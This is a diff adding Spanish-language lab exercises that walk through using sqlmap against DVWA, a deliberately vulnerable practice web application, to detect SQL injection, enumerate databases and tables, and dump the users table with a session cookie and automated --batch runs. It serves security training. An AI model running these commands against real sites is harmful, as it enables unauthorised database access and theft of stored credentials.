@@ -11,4 +11,43 @@
 ++ Uso general de SQLMAP
 --- sqlmap --help
 
+++ Ejercicio_1 (Encontrar vulnerabilidades)
+--- Ir a la interfaz web de dvwa
+--- Apartado sql injection
+--- Ingresar un id
+--- Copiar el url asociado al id
+--- Volver a la terminal
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low'
+--- Volver al sitio web ---> inspeccionar ---> storage ---> copiar el valor asociado a PHPSESSIONID
+--- Pegarlo en la terminal
+--- Enter
+--- Se mostrarán las vulnerabilidades asociadas
+
+
+++ Ejercicio_2 (Extraer información básica)
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --dbs
+--- Enter
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --dbs --tables -D dvwa ----> (Para extraer la tabla dvwa)
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --dbs --tables -D information_schema ----> (Para enumerar las tablas asociadas a la base de datos information_schema)
+
+
+++ Ejercicio_3 (Extraer información en detalle)
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --dbs --tables -D dvwa -t users --dump-all ----> (Para ver la información de las tablas como tal)
+--- y
+--- y
+--- Se nos mostrará en detalle la información asociada a las tablas (contenido)
+
+
+++ Ejercicio_4 (Automatizar ataque SQL)
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --batch
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' --dbs --batch
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' -D dvwa --tables --batch
+--- sqlmap -u <url> --cookie='PHPSESSIONID=<cookie>; security=low' -D dvwa -T users --dump-all --batch
+
+
+
+
+
+
+
 
